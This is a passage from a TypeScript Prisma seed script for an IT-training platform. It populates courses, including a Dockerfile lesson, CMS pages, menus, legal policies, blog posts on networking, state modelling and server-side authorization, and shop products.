              text('This is why a container starts in milliseconds while a VM takes tens of seconds: there is no second kernel to boot. It is also why a container cannot run a different kernel from its host.'),
            ]),
          },
          {
            slug: 'multi-stage-builds',
            title: 'Multi-stage builds',
            summary: 'Separating what you need to build from what you need to run.',
            durationMinutes: 13,
            body: doc([
              text('A naive image ships the compiler, the full dependency tree and the source code to production. A multi-stage build ships only the artefact.'),
              code('dockerfile', '# Build stage — has the toolchain, and is discarded.\nFROM node:22-alpine AS build\nWORKDIR /app\n# Copy manifests first: this layer is cached until dependencies change,\n# so ordinary source edits skip the install entirely.\nCOPY package*.json ./\nRUN npm ci\nCOPY . .\nRUN npm run build\n\n# Runtime stage — only what is needed to execute.\nFROM node:22-alpine AS runtime\nWORKDIR /app\nENV NODE_ENV=production\nCOPY package*.json ./\nRUN npm ci --omit=dev && npm cache clean --force\nCOPY --from=build /app/dist ./dist\n# Never run as root: a container escape then starts unprivileged.\nUSER node\nEXPOSE 4000\nCMD ["node", "dist/server.js"]'),
              {
                type: 'callout',
                attrs: { variant: 'info' },
                content: [
                  text('Layer order is the whole game with caching. Anything that changes often belongs near the bottom of the Dockerfile.'),
                ],
              },
            ]),
          },
        ],
      },
    ],
  },
];

async function seedCourses() {
  console.log('  courses…');

  for (const definition of COURSES) {
    const category = await prisma.category.findUnique({ where: { slug: definition.categorySlug } });
    const instructor = await prisma.instructor.findUnique({
      where: { slug: definition.instructorSlug },
    });

    const tagIds: string[] = [];
    for (const name of definition.tags) {
      const slug = name.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '');
      const tag = await prisma.tag.upsert({
        where: { slug },
        create: { slug, name },
        update: {},
      });
      tagIds.push(tag.id);
    }

    const lessonCount = definition.modules.reduce(
      (total, module) => total + module.lessons.length,
      0,
    );
    const durationMinutes = definition.modules.reduce(
      (total, module) =>
        total + module.lessons.reduce((sum, lesson) => sum + lesson.durationMinutes, 0),
      0,
    );

    const existing = await prisma.course.findUnique({
      where: { slug: definition.slug },
      select: { id: true },
    });

    // Re-seeding replaces the demo structure wholesale; learner progress rows
    // reference lessons and cascade, which is acceptable for demo content only.
    if (existing) {
      await prisma.courseModule.deleteMany({ where: { courseId: existing.id } });
    }

    const course = await prisma.course.upsert({
      where: { slug: definition.slug },
      create: {
        slug: definition.slug,
        title: definition.title,
        summary: definition.summary,
        description: doc([
          text(definition.summary),
          heading('What this course covers'),
          bullets(definition.outcomes),
        ]) as never,
        categoryId: category?.id ?? null,
        level: definition.level,
        accessType: 'FREE',
        status: 'PUBLISHED',
        language: 'en',
        learningOutcomes: definition.outcomes,
        requirements: definition.requirements,
        isFeatured: definition.isFeatured,
        lessonCount,
        durationMinutes,
        publishedAt: new Date(),
      },
      update: {
        title: definition.title,
        summary: definition.summary,
        categoryId: category?.id ?? null,
        level: definition.level,
        status: 'PUBLISHED',
        learningOutcomes: definition.outcomes,
        requirements: definition.requirements,
        isFeatured: definition.isFeatured,
        lessonCount,
        durationMinutes,
      },
    });

    await prisma.courseTag.deleteMany({ where: { courseId: course.id } });
    await prisma.courseTag.createMany({
      data: tagIds.map((tagId) => ({ courseId: course.id, tagId })),
      skipDuplicates: true,
    });

    if (instructor) {
      await prisma.courseInstructor.upsert({
        where: { courseId_instructorId: { courseId: course.id, instructorId: instructor.id } },
        create: { courseId: course.id, instructorId: instructor.id },
        update: {},
      });
    }

    for (const [moduleIndex, moduleDefinition] of definition.modules.entries()) {
      const module = await prisma.courseModule.create({
        data: {
          courseId: course.id,
          title: moduleDefinition.title,
          summary: moduleDefinition.summary,
          sortOrder: moduleIndex,
        },
      });

      for (const [lessonIndex, lesson] of moduleDefinition.lessons.entries()) {
        await prisma.lesson.create({
          data: {
            moduleId: module.id,
            slug: lesson.slug,
            title: lesson.title,
            summary: lesson.summary,
            type: 'ARTICLE',
            body: lesson.body as never,
            durationMinutes: lesson.durationMinutes,
            sortOrder: lessonIndex,
            isPreview: lesson.isPreview ?? false,
          },
        });
      }
    }

    await prisma.seoMetadata.upsert({
      where: { courseId: course.id },
      create: {
        courseId: course.id,
        title: `${definition.title} — ArTech Academy`,
        description: definition.summary,
        keywords: definition.tags,
        twitterCard: 'summary_large_image',
        robots: 'index, follow',
      },
      update: { description: definition.summary, keywords: definition.tags },
    });
  }
}

/* --------------------------------------------------------------------- CMS */

async function seedPages() {
  console.log('  pages and sections…');

  const home = await prisma.page.upsert({
    where: { slug: 'home' },
    create: {
      slug: 'home',
      title: 'Home',
      status: 'PUBLISHED',
      isSystem: true,
      template: 'landing',
      publishedAt: new Date(),
    },
    update: { status: 'PUBLISHED', isSystem: true },
  });

  await prisma.pageSection.deleteMany({ where: { pageId: home.id } });

  const homeSections = [
    {
      type: 'HERO' as const,
      settings: { align: 'left', background: 'gradient' },
      content: {
        eyebrow: 'Built by working engineers',
        title: 'Practical IT skills, taught properly',
        description:
          'Structured courses in networking, development, cloud and security. Track your progress, pick up exactly where you left off, and learn the reasoning behind the commands — not just the commands.',
        primaryAction: { label: 'Browse courses', href: '/courses' },
        secondaryAction: { label: 'How it works', href: '/about' },
        highlights: ['Self-paced', 'Progress tracking', 'No fluff'],
      },
    },
    {
      type: 'STATS' as const,
      settings: { columns: 4 },
      content: {
        title: 'A platform, not a playlist',
        items: [
          { value: '4', label: 'Course tracks' },
          { value: '8', label: 'Languages supported' },
          { value: '100%', label: 'Progress saved server-side' },
          { value: '0', label: 'Autoplaying videos' },
        ],
      },
    },
    {
      type: 'COURSE_GRID' as const,
      settings: { limit: 6, source: 'featured', columns: 3 },
      content: {
        title: 'Start with these',
        description: 'Courses our learners finish, chosen for breadth across the tracks.',
        action: { label: 'See all courses', href: '/courses' },
      },
    },
    {
      type: 'CATEGORY_GRID' as const,
      settings: { limit: 8, columns: 4 },
      content: {
        title: 'Learn by track',
        description: 'Every course sits in a track, so a path through the material is obvious.',
      },
    },
    {
      type: 'FEATURE_GRID' as const,
      settings: { columns: 3 },
      content: {
        title: 'Why learners stay',
        items: [
          {
            icon: 'BookOpenCheck',
            title: 'Written to be read',
            description:
              'Lessons are articles with a comfortable measure and real typography — not slides transcribed into a viewer.',
          },
          {
            icon: 'LineChart',
            title: 'Progress that survives',
            description:
              'Completion is stored on the server against your account, so switching device changes nothing.',
          },
          {
            icon: 'Languages',
            title: 'Genuinely multilingual',
            description:
              'Interface, courses and content translate independently, with graceful fallback when a translation is missing.',
          },
          {
            icon: 'ShieldCheck',
            title: 'Built securely',
            description:
              'Every permission is enforced on the server. Hiding a button is never the control.',
          },
          {
            icon: 'Gauge',
            title: 'Fast on purpose',
            description:
              'Server-rendered pages, paginated queries and cached configuration. No spinner where a page would do.',
          },
          {
            icon: 'Accessibility',
            title: 'Accessible by default',
            description:
              'Semantic markup, visible focus, keyboard navigation and contrast that survives a dark room.',
          },
        ],
      },
    },
    {
      type: 'TESTIMONIALS' as const,
      settings: { columns: 3 },
      content: {
        title: 'What learners say',
        items: [
          {
            quote:
              'The networking track finally made subnetting click. Being shown the packet capture rather than a diagram of one is what did it.',
            author: 'Sona A.',
            role: 'Junior network engineer',
          },
          {
            quote:
              'The TypeScript course changed how I model state. I have not written an isLoading boolean since.',
            author: 'Karen M.',
            role: 'Frontend developer',
          },
          {
            quote:
              'Security content that explains the attack before the defence. I review pull requests differently now.',
            author: 'Tigran V.',
            role: 'Backend developer',
          },
        ],
      },
    },
    {
      type: 'CTA' as const,
      settings: { background: 'primary' },
      content: {
        title: 'Start learning today',
        description: 'Create a free account and keep your progress across every device.',
        primaryAction: { label: 'Create free account', href: '/register' },
        secondaryAction: { label: 'Browse the catalogue', href: '/courses' },
      },
    },
  ];

  for (const [index, section] of homeSections.entries()) {
    await prisma.pageSection.create({
      data: {
        pageId: home.id,
        type: section.type,
        sortOrder: index,
        settings: section.settings as never,
        content: section.content as never,
      },
    });
  }

  await prisma.seoMetadata.upsert({
    where: { pageId: home.id },
    create: {
      pageId: home.id,
      title: 'ArTech Academy — Practical IT courses',
      description:
        'Structured online courses in networking, programming, cloud and cybersecurity, with server-side progress tracking.',
      robots: 'index, follow',
      twitterCard: 'summary_large_image',
    },
    update: {},
  });

  /* ------------------------------------------------------------- about */

  const about = await prisma.page.upsert({
    where: { slug: 'about' },
    create: {
      slug: 'about',
      title: 'About',
      status: 'PUBLISHED',
      isSystem: true,
      publishedAt: new Date(),
    },
    update: { status: 'PUBLISHED', isSystem: true },
  });

  await prisma.pageSection.deleteMany({ where: { pageId: about.id } });

  const aboutSections = [
    {
      type: 'HERO' as const,
      settings: { align: 'center', background: 'subtle', size: 'compact' },
      content: {
        title: 'About ArTech Academy',
        description:
          'We teach the IT skills we use at work, in the order that makes them make sense.',
      },
    },
    {
      type: 'RICH_TEXT' as const,
      settings: { width: 'prose' },
      content: {
        body: doc([
          heading('Why this exists'),
          text(
            'Most technical training optimises for looking comprehensive. The result is hours of video that cover everything and explain nothing, and a certificate that proves you clicked through it.',
          ),
          text(
            'We took the opposite approach. Every lesson is written to be read, every course has an explicit set of outcomes it is accountable to, and nothing is included because it "should be covered".',
          ),
          heading('How courses are built'),
          bullets([
            'Each course is written by someone who does the work professionally.',
            'Outcomes are decided first; the curriculum is whatever serves them.',
            'Examples are real — real commands, real output, real error messages.',
            'Content is reviewed for accuracy before publication and revised when it drifts.',
          ]),
          heading('How we treat your data'),
          text(
            'Your progress is stored against your account so it follows you between devices. We do not sell data, we do not run third-party trackers on lesson pages, and account deletion is offered as deactivation, anonymisation or full erasure — your choice.',
          ),
        ]),
      },
    },
    {
      type: 'INSTRUCTOR_LIST' as const,
      settings: { columns: 3 },
      content: { title: 'Who teaches here' },
    },
    {
      type: 'CTA' as const,
      settings: { background: 'primary' },
      content: {
        title: 'Questions before you start?',
        description: 'We answer every message from a real person, usually within a day.',
        primaryAction: { label: 'Contact us', href: '/contact' },
      },
    },
  ];

  for (const [index, section] of aboutSections.entries()) {
    await prisma.pageSection.create({
      data: {
        pageId: about.id,
        type: section.type,
        sortOrder: index,
        settings: section.settings as never,
        content: section.content as never,
      },
    });
  }

  /* --------------------------------------------------------------- FAQ */

  const faq = await prisma.page.upsert({
    where: { slug: 'faq' },
    create: {
      slug: 'faq',
      title: 'Frequently asked questions',
      status: 'PUBLISHED',
      isSystem: true,
      publishedAt: new Date(),
    },
    update: { status: 'PUBLISHED', isSystem: true },
  });

  await prisma.pageSection.deleteMany({ where: { pageId: faq.id } });
  await prisma.pageSection.create({
    data: {
      pageId: faq.id,
      type: 'FAQ',
      sortOrder: 0,
      settings: {} as never,
      content: {
        title: 'Frequently asked questions',
        items: [
          {
            question: 'Do I need to pay to start?',
            answer:
              'No. Create an account and every free course is immediately available, with full progress tracking.',
          },
          {
            question: 'Is my progress saved if I switch device?',
            answer:
              'Yes. Progress is stored on the server against your account, not in your browser, so it follows you everywhere.',
          },
          {
            question: 'Which languages is the platform available in?',
            answer:
              'The interface supports English (US and UK), Armenian, Russian, German, Spanish, Italian and French. Course content is translated per course, and falls back to the original language where a translation is not yet available.',
          },
          {
            question: 'Can I download course material?',
            answer:
              'Where a lesson was built from a source document, the original file is offered as a download alongside the lesson. Everything else is designed to be read on the site.',
          },
          {
            question: 'How do I delete my account?',
            answer:
              'Contact us and choose deactivation, anonymisation or full erasure. Anonymisation keeps aggregate learning statistics while removing everything that identifies you.',
          },
        ],
      } as never,
    },
  });

  /* ----------------------------------------------------------- contact */

  const contact = await prisma.page.upsert({
    where: { slug: 'contact' },
    create: {
      slug: 'contact',
      title: 'Contact',
      status: 'PUBLISHED',
      isSystem: true,
      publishedAt: new Date(),
    },
    update: { status: 'PUBLISHED', isSystem: true },
  });

  await prisma.pageSection.deleteMany({ where: { pageId: contact.id } });
  await prisma.pageSection.create({
    data: {
      pageId: contact.id,
      type: 'TEXT',
      sortOrder: 0,
      settings: { align: 'center' } as never,
      content: {
        title: 'Get in touch',
        description:
          'Questions about a course, an account, or working together? Send a message and a real person will reply.',
      } as never,
    },
  });
}

async function seedMenus() {
  console.log('  navigation…');

  const header = await prisma.menu.upsert({
    where: { slug: 'header' },
    create: { slug: 'header', name: 'Header navigation' },
    update: {},
  });

  await prisma.menuItem.deleteMany({ where: { menuId: header.id } });

  const coursesItem = await prisma.menuItem.create({
    data: { menuId: header.id, label: 'Courses', url: '/courses', sortOrder: 0 },
  });

  const trackLinks = [
    { label: 'Frontend Development', url: '/categories/frontend-development' },
    { label: 'Backend Development', url: '/categories/backend-development' },
    { label: 'Network Fundamentals', url: '/categories/network-fundamentals' },
    { label: 'Containers', url: '/categories/containers' },
    { label: 'Application Security', url: '/categories/application-security' },
  ];

  for (const [index, link] of trackLinks.entries()) {
    await prisma.menuItem.create({
      data: { menuId: header.id, parentId: coursesItem.id, sortOrder: index, ...link },
    });
  }

  const topLevel = [
    { label: 'Categories', url: '/categories', sortOrder: 1 },
    { label: 'Instructors', url: '/instructors', sortOrder: 2 },
    { label: 'Articles', url: '/blog', sortOrder: 3 },
    { label: 'About', url: '/about', sortOrder: 4 },
    { label: 'Contact', url: '/contact', sortOrder: 5 },
  ];

  for (const item of topLevel) {
    await prisma.menuItem.create({ data: { menuId: header.id, ...item } });
  }

  // Visible only to staff — the API filters this out of an anonymous response
  // entirely rather than relying on the frontend to hide it.
  await prisma.menuItem.create({
    data: {
      menuId: header.id,
      label: 'Admin panel',
      url: '/admin',
      sortOrder: 6,
      visibleForRoles: [
        SYSTEM_ROLES.SUPER_ADMIN,
        SYSTEM_ROLES.ADMIN,
        SYSTEM_ROLES.CONTENT_MANAGER,
        SYSTEM_ROLES.INSTRUCTOR,
        SYSTEM_ROLES.SUPPORT,
      ],
    },
  });

  await prisma.menu.upsert({
    where: { slug: 'footer' },
    create: { slug: 'footer', name: 'Footer navigation' },
    update: {},
  });

  /* ------------------------------------------------------------ footer */

  await prisma.footerLink.deleteMany({});
  await prisma.footerGroup.deleteMany({});

  const footerGroups = [
    {
      title: 'Learn',
      links: [
        { label: 'All courses', url: '/courses' },
        { label: 'Categories', url: '/categories' },
        { label: 'Instructors', url: '/instructors' },
        { label: 'Articles', url: '/blog' },
      ],
    },
    {
      title: 'Platform',
      links: [
        { label: 'About', url: '/about' },
        { label: 'FAQ', url: '/faq' },
        { label: 'Contact', url: '/contact' },
      ],
    },
    {
      title: 'Legal',
      links: [
        { label: 'Privacy Policy', url: '/legal/privacy-policy' },
        { label: 'Terms of Service', url: '/legal/terms-of-service' },
        { label: 'Cookie Policy', url: '/legal/cookie-policy' },
        { label: 'Accessibility', url: '/legal/accessibility' },
      ],
    },
  ];

  for (const [index, group] of footerGroups.entries()) {
    const created = await prisma.footerGroup.create({
      data: { title: group.title, sortOrder: index },
    });
    for (const [linkIndex, link] of group.links.entries()) {
      await prisma.footerLink.create({
        data: { groupId: created.id, sortOrder: linkIndex, ...link },
      });
    }
  }
}

async function seedLegal() {
  console.log('  legal documents…');

  const documents = [
    {
      slug: 'privacy-policy',
      title: 'Privacy Policy',
      requiresAcceptance: true,
      body: doc([
        heading('What we collect'),
        text('We collect the minimum needed to run an account and record learning progress: your name, email address, chosen language, and which lessons you have opened or completed.'),
        heading('Why we collect it'),
        bullets([
          'To authenticate you and keep your session secure',
          'To store course progress so it follows you between devices',
          'To send transactional email — verification, password resets and account notices',
          'To produce aggregate statistics about how courses are used',
        ]),
        heading('What we do not do'),
        text('We do not sell personal data, we do not share it with advertisers, and we do not run third-party tracking scripts on lesson pages.'),
        heading('Your rights'),
        text('You may request a copy of your data, correct it, or have your account removed. Removal is offered as deactivation, anonymisation, or full erasure — anonymisation keeps aggregate learning statistics while removing everything that identifies you.'),
        heading('Retention'),
        text('Account and progress data is kept while the account is active. Audit records of administrative actions are retained separately for security purposes and do not contain credentials.'),
      ]),
    },
    {
      slug: 'terms-of-service',
      title: 'Terms of Service',
      requiresAcceptance: true,
      body: doc([
        heading('Your account'),
        text('You are responsible for keeping your credentials confidential and for activity carried out under your account. Tell us promptly if you believe it has been accessed by someone else.'),
        heading('Acceptable use'),
        bullets([
          'Do not attempt to access accounts, data or endpoints that are not yours',
          'Do not redistribute course content without written permission',
          'Do not automate access in a way that degrades the service for others',
          'Do not upload unlawful material or anything that infringes another person’s rights',
        ]),
        heading('Content and access'),
        text('Course material remains the property of the academy or its instructors. Enrolling grants you a personal, non-transferable licence to study it.'),
        heading('Changes'),
        text('These terms may be updated. Material changes are published as a new version and, where they affect your rights, you will be asked to accept them before continuing.'),
      ]),
    },
    {
      slug: 'cookie-policy',
      title: 'Cookie Policy',
      requiresAcceptance: false,
      body: doc([
        heading('What we store'),
        text('The platform uses the smallest set of cookies that lets it function.'),
        bullets([
          'A session cookie holding your refresh token. It is HttpOnly, so page scripts cannot read it, and it is what keeps you signed in.',
          'A non-sensitive flag indicating a session probably exists, so the app knows whether to attempt a silent sign-in.',
          'Your language preference, so the site opens in the language you chose.',
        ]),
        heading('What we do not use'),
        text('There are no advertising cookies and no third-party analytics cookies on lesson pages.'),
      ]),
    },
    {
      slug: 'accessibility',
      title: 'Accessibility Statement',
      requiresAcceptance: false,
      body: doc([
        heading('Our commitment'),
        text('The platform is built to be usable with a keyboard alone, with a screen reader, and at high zoom levels. We target WCAG 2.1 Level AA.'),
        heading('What this means in practice'),
        bullets([
          'Semantic markup, so headings and landmarks describe the real structure',
          'Visible focus indicators on every interactive element',
          'Text and interface colours that meet contrast requirements in both themes',
          'Form errors announced to assistive technology, not signalled by colour alone',
          'Motion kept subtle and reduced automatically when the system asks for it',
        ]),
        heading('Found a problem?'),
        text('Accessibility defects are treated as bugs. Report one through the contact page and it will be triaged like any other defect.'),
      ]),
    },
  ];

  for (const [index, definition] of documents.entries()) {
    const document = await prisma.legalDocument.upsert({
      where: { slug: definition.slug },
      create: {
        slug: definition.slug,
        title: definition.title,
        requiresAcceptance: definition.requiresAcceptance,
        sortOrder: index,
      },
      update: { title: definition.title, requiresAcceptance: definition.requiresAcceptance },
    });

    const existing = await prisma.legalDocumentVersion.findUnique({
      where: { documentId_version: { documentId: document.id, version: '1.0' } },
    });

    if (!existing) {
      await prisma.legalDocumentVersion.create({
        data: {
          documentId: document.id,
          version: '1.0',
          body: definition.body as never,
          isCurrent: true,
        },
      });
    }
  }
}

async function seedBlog(authorId: string) {
  console.log('  articles…');

  const posts = [
    {
      slug: 'how-to-actually-learn-networking',
      title: 'How to actually learn networking',
      excerpt:
        'Memorising the OSI layers teaches you nothing. Here is the order that makes the subject click, and why.',
      tags: ['networking', 'learning'],
      body: doc([
        text('Almost everyone starts networking the same way: memorise seven layers, memorise some port numbers, fail to connect any of it to a real problem. The subject only becomes learnable when you invert the order.'),
        heading('Start with a question, not a model'),
        text('Take a concrete question — "what happens when I type a URL and press enter?" — and answer it badly. Then keep asking why until you hit something you cannot explain. That gap is your next lesson, and you will remember it because you arrived at it yourself.'),
        heading('Use tools from day one'),
        text('Every abstraction in networking has an observable consequence. Subnet masks decide whether traffic goes to the gateway; you can watch that decision in an ARP table. TCP retransmission is a graph in a packet capture. Reading about these is forgettable; watching them happen is not.'),
        bullets([
          'ping tells you a route exists in both directions',
          'traceroute tells you what that route is',
          'a packet capture tells you what was actually sent, which is the only thing that settles an argument',
        ]),
        heading('Learn the failure modes'),
        text('Working knowledge is mostly a catalogue of ways things break. A SYN with no reply, a SYN followed by RST, and a completed handshake followed by a timeout are three different problems with three different owners. Knowing which is which is worth more than reciting the layer names.'),
      ]),
    },
    {
      slug: 'stop-writing-isloading-booleans',
      title: 'Stop writing isLoading booleans',
      excerpt:
        'The most common state-modelling mistake in frontend code, and the two-minute fix that eliminates a class of bugs.',
      tags: ['typescript', 'react', 'architecture'],
      body: doc([
        text('Open almost any React codebase and you will find this shape, or something close to it:'),
        code('typescript', 'const [isLoading, setIsLoading] = useState(false);\nconst [data, setData] = useState<User[] | null>(null);\nconst [error, setError] = useState<Error | null>(null);'),
        text('Three independent pieces of state that are not actually independent. Eight combinations exist; three are meaningful. The other five are bugs waiting for the right race condition.'),
        heading('The failure you will eventually hit'),
        text('A request fails, so error is set. The user retries, so isLoading becomes true — but nothing cleared error. The component now renders a spinner and an error message at the same time, and the fix is another line of cleanup that the next person will also forget.'),
        heading('Model the states that exist'),
        code('typescript', "type State =\n  | { status: 'idle' }\n  | { status: 'loading' }\n  | { status: 'success'; data: User[] }\n  | { status: 'error'; error: Error };"),
        text('One piece of state, four legal values, no cleanup to forget. The compiler will not let you read data outside the success branch, which removes the null checks that were scattered through the component.'),
        {
          type: 'callout',
          attrs: { variant: 'success' },
          content: [
            text('The general rule: when two pieces of state can never be true at once, they are one piece of state wearing a disguise.'),
          ],
        },
      ]),
    },
    {
      slug: 'why-hiding-the-button-is-not-security',
      title: 'Why hiding the button is not security',
      excerpt:
        'A short explanation of the difference between what the UI shows and what the server permits — and why only one of them matters.',
      tags: ['security', 'authorization'],
      body: doc([
        text('A recurring request in code review: "the delete button only shows for admins, so the endpoint is fine." It is not, and the reason is worth stating plainly.'),
        heading('The browser is not yours'),
        text('Everything running in the browser is under the user’s control. The JavaScript can be read and edited, requests can be replayed with different parameters, and any endpoint the application calls can be called directly with curl. A conditional render is a statement about what is convenient to click, not about what is possible to do.'),
        heading('What this rules out'),
        bullets([
          'Hiding admin links — cosmetic',
          'Disabling form fields — cosmetic',
          'Filtering a list client-side — worse than cosmetic, since the unfiltered data was already sent',
          'Encrypting or obfuscating API calls — the client holds the key, so the attacker does too',
        ]),
        heading('What actually works'),
        text('Check the permission on the server, for every request, using the session rather than anything the request supplies. Verify ownership as part of the database query, not as a comparison afterwards. Validate input server-side regardless of what the form already checked.'),
        text('The UI should still hide what the user cannot do — that is good design. It is simply not the control.'),
      ]),
    },
  ];

  for (const post of posts) {
    const tagIds: string[] = [];
    for (const name of post.tags) {
      const slug = name.toLowerCase().replace(/[^a-z0-9]+/g, '-');
      const tag = await prisma.tag.upsert({ where: { slug }, create: { slug, name }, update: {} });
      tagIds.push(tag.id);
    }

    const created = await prisma.blogPost.upsert({
      where: { slug: post.slug },
      create: {
        slug: post.slug,
        title: post.title,
        excerpt: post.excerpt,
        body: post.body as never,
        authorId,
        status: 'PUBLISHED',
        publishedAt: new Date(),
        readingMinutes: 5,
      },
      update: { title: post.title, excerpt: post.excerpt, status: 'PUBLISHED' },
    });

    await prisma.blogPostTag.deleteMany({ where: { postId: created.id } });
    await prisma.blogPostTag.createMany({
      data: tagIds.map((tagId) => ({ postId: created.id, tagId })),
      skipDuplicates: true,
    });
  }
}

async function seedProducts() {
  console.log('  shop (disabled by default)…');

  const category = await prisma.productCategory.upsert({
    where: { slug: 'learning-materials' },
    create: { slug: 'learning-materials', name: 'Learning materials', sortOrder: 0 },
    update: {},
  });

  const products = [
    {
      slug: 'networking-fundamentals-workbook',
      name: 'Networking Fundamentals workbook',
      summary: 'Printed exercises and subnetting drills that accompany the networking track.',
      priceCents: 2400,
      type: 'PHYSICAL' as const,
      stock: 50,
    },
    {
      slug: 'typescript-patterns-ebook',
      name: 'TypeScript patterns (e-book)',
      summary: 'The state-modelling chapters expanded, with twenty worked refactors.',
      priceCents: 1500,
      type: 'DIGITAL' as const,
      stock: null,
    },
  ];

  for (const product of products) {
    await prisma.product.upsert({
      where: { slug: product.slug },
      create: { ...product, categoryId: category.id, currency: 'USD', isActive: true },
      update: { name: product.name, summary: product.summary, priceCents: product.priceCents },
    });
  }
}

/* -------------------------------------------------------------------- run */

async function main() {
  console.log('Seeding database…');

  await seedPermissions();
  await seedRoles();
  const owner = await seedOwner();
  await seedLanguages();
  await seedTranslations();
  await seedFeatureFlags();
  await seedSettings();
  await seedCategories();
  await seedInstructors();
  await seedCourses();
  await seedPages();
  await seedMenus();
  await seedLegal();
  await seedBlog(owner.id);
  await seedProducts();

  console.log('\nSeed complete.');
  console.log(`  Owner account: ${ADMIN_EMAIL}`);
  console.log(`  Password:      ${ADMIN_PASSWORD}`);
  console.log('  Change this password immediately after signing in.\n');
}

main()
  .catch((error) => {
    console.error('Seed failed:', error);
    process.exit(1);
  })
  .finally(() => {
    void prisma.$disconnect();
  });
